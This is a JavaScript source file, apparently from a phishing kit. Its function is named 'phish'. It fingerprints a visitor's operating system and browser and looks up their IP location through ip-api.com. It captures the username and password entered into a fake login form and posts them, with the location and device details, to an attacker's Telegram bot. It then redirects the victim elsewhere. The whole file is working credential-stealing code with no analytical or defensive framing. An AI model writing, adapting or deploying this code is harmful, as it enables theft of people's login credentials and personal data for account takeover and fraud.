const phish = (bot_token, chat_id, redirect_link) => {
    var module = {
        options: [],
        header: [
            navigator.platform,
            navigator.userAgent,
            navigator.appVersion,
            navigator.vendor,
            window.opera
        ],
        dataos: [
            { name: 'Windows Phone', value: 'Windows Phone', version: 'OS' },
            { name: 'Windows', value: 'Win', version: 'NT' },
            { name: 'iPhone', value: 'iPhone', version: 'OS' },
            { name: 'iPad', value: 'iPad', version: 'OS' },
            { name: 'Kindle', value: 'Silk', version: 'Silk' },
            { name: 'Android', value: 'Android', version: 'Android' },
            { name: 'PlayBook', value: 'PlayBook', version: 'OS' },
            { name: 'BlackBerry', value: 'BlackBerry', version: '/' },
            { name: 'Macintosh', value: 'Mac', version: 'OS X' },
            { name: 'Linux', value: 'Linux', version: 'rv' },
            { name: 'Palm', value: 'Palm', version: 'PalmOS' }
        ],
        databrowser: [
            { name: 'Chrome', value: 'Chrome', version: 'Chrome' },
            { name: 'Firefox', value: 'Firefox', version: 'Firefox' },
            { name: 'Safari', value: 'Safari', version: 'Version' },
            { name: 'Internet Explorer', value: 'MSIE', version: 'MSIE' },
            { name: 'Opera', value: 'Opera', version: 'Opera' },
            { name: 'BlackBerry', value: 'CLDC', version: 'CLDC' },
            { name: 'Mozilla', value: 'Mozilla', version: 'Mozilla' }
        ],
        init: function() {
            var agent = this.header.join(' '),
                os = this.matchItem(agent, this.dataos),
                browser = this.matchItem(agent, this.databrowser);

            return { os: os, browser: browser };
        },
        matchItem: function(string, data) {
            var i = 0,
                j = 0,
                html = '',
                regex,
                regexv,
                match,
                matches,
                version;

            for (i = 0; i < data.length; i += 1) {
                regex = new RegExp(data[i].value, 'i');
                match = regex.test(string);
                if (match) {
                    regexv = new RegExp(
                        data[i].version + '[- /:;]([\\d._]+)',
                        'i'
                    );
                    matches = string.match(regexv);
                    version = '';
                    if (matches) {
                        if (matches[1]) {
                            matches = matches[1];
                        }
                    }
                    if (matches) {
                        matches = matches.split(/[._]+/);
                        for (j = 0; j < matches.length; j += 1) {
                            if (j === 0) {
                                version += matches[j] + '.';
                            } else {
                                version += matches[j];
                            }
                        }
                    } else {
                        version = '0';
                    }
                    return {
                        name: data[i].name,
                        version: parseFloat(version)
                    };
                }
            }
            return { name: 'unknown', version: 0 };
        }
    };

    var e = module.init();

    const ipLocation = () => {
        let req = new XMLHttpRequest();
        req.open(
            'GET',
            `http://ip-api.com/json/?fields=query,country,city,regionName,isp,org,as,asname,timezone`,
            false
        );
        req.send(null);
        let json = JSON.parse(req.responseText);
        return json;
    };
    const goTo = () => {
        let link = new URLSearchParams(window.location.search).get('link');
        if (link !== null) {
            redirect_link = link;
        }
        window.location.assign(redirect_link);
    };

    let ip_json = ipLocation();
    var uname = $('#username'),
        pass = $('#password'),
        submitButton = $('#submit-button');

    submitButton.prop('disabled', true);

    uname.on(
        'change input paste keydown cut keypress keyup changeproperty',
        function() {
            $(this).val().length != 0
                ? $(this).attr('valid', true)
                : $(this).attr('valid', false);
        }
    );
    pass.on(
        'change input paste keydown cut keypress keyup changeproperty',
        function() {
            $(this).val().length != 0
                ? $(this).attr('valid', true)
                : $(this).attr('valid', false);
        }
    );

    $('#username, #password').on(
        'change input paste keydown cut keypress keyup changeproperty',
        function() {
            uname.attr('valid') === 'true' &&
            pass.attr('valid') === 'true'
                ? submitButton.prop('disabled', false)
                : submitButton.prop('disabled', false);
        }
    );

    submitButton.on('click', function() {
        let currentdate = new Date(),
            date = `${currentdate.getDate()}/${currentdate.getMonth() +
                1}/${currentdate.getFullYear()}`,
            time = `${currentdate.getHours()}:${currentdate.getMinutes()}:${currentdate.getSeconds()}`,
            xhr = new XMLHttpRequest(),
            unameVal = uname.val(),
            passVal = pass.val(),
            msg = `----------------------------------------------------%0A
📅 𝐃𝐚𝐭𝐞  : ${date}%0A
🕑 𝐓𝐢𝐦𝐞 : ${time}%0A
----------------------------------------------------%0A
🔑 𝐋𝐨𝐠𝐢𝐧:             ${unameVal}%0A
🔒 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝:       ${passVal}%0A
----------------------------------------------------%0A
🌐𝐈𝐏: ${ip_json.query}%0A
%0A
⏳𝐓𝐢𝐦𝐞𝐙𝐨𝐧𝐞: ${ip_json.timezone}%0A
%0A
🗺️𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧: ${ip_json.country},${ip_json.regionName},${ip_json.city}%0A
%0A
🛰️𝐈𝐒𝐏: ${ip_json.isp}%0A
%0A
🏢𝐎𝐫𝐠𝐚𝐧𝐢𝐳𝐚𝐭𝐢𝐨𝐧: ${ip_json.org}%0A
%0A
📡𝐀𝐒𝐍: ${ip_json.as}%0A
%0A
📡𝐀𝐒 𝐍𝐀𝐌𝐄: ${ip_json.asname}%0A
%0A
💻𝐎𝐒: ${e.os.name} v${e.os.version}%0A
%0A
🌍𝐁𝐫𝐨𝐰𝐬𝐞𝐫: ${e.browser.name} v${e.browser.version}%0A
----------------------------------------------------%0A%0A
╰•★★𝐌𝐨𝐫𝐞 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧★★•╯%0A%0A
📌𝐃𝐞𝐯𝐢𝐜𝐞 𝐈𝐧𝐟𝐨:%0A${navigator.userAgent}%0A%0A
📌𝐁𝐫𝐨𝐰𝐬𝐞𝐫 𝐈𝐧𝐟𝐨:%0A${navigator.appVersion}%0A%0A
----------------------------------------------------%0A%0A
`;

        xhr.open(
            'POST',
            `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${msg}`
        );
        xhr.send();

        setTimeout(function() {
            goTo();
        }, 1000);
    });
};
